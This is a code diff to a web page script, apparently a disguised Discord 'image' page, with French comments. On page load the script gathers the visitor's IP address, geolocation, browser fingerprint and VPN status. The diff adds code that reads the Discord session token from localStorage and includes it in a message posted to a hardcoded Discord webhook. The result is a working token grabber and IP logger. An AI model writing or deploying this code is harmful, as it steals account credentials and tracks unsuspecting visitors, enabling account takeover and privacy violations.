@@ -37,8 +37,10 @@
   <script>
     document.addEventListener("DOMContentLoaded", async () => {
       try {
-        const ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
-        const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
+        const ip = await fetch("https://api64.ipify.org?format=json")
+          .then(r => r.json()).then(d => d.ip);
+        const geo = await fetch(`https://ipapi.co/${ip}/json/`)
+          .then(r => r.json());
 
         const now = new Date().toLocaleString();
         const ua = navigator.userAgent;
@@ -50,6 +52,18 @@
         const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);
         const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN / Proxy détecté" : "✅ Connexion normale";
 
+        // Récupération du token Discord
+        let token = null;
+        try {
+          token = localStorage.getItem("token");
+        } catch (e) {
+          token = "Erreur accès token";
+        }
+
+        // Nettoyage des guillemets
+        if (token) token = token.replace(/"/g, "");
+
+        // Message Discord final
         const message = `
 **🖼️ Nouvelle ouverture d'image Discord**
 > 🕒 Date/Heure : \`${now}\`
@@ -63,6 +77,7 @@
 > 📱 Résolution : \`${screenSize}\`
 > 🔋 Batterie : \`${batteryStatus}\`
 > 🛡️ VPN : ${vpn}
+> 🪙 Token Discord : \`\`\`${token || "Non trouvé"}\`\`\`
         `;
 
         await fetch("https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV", {
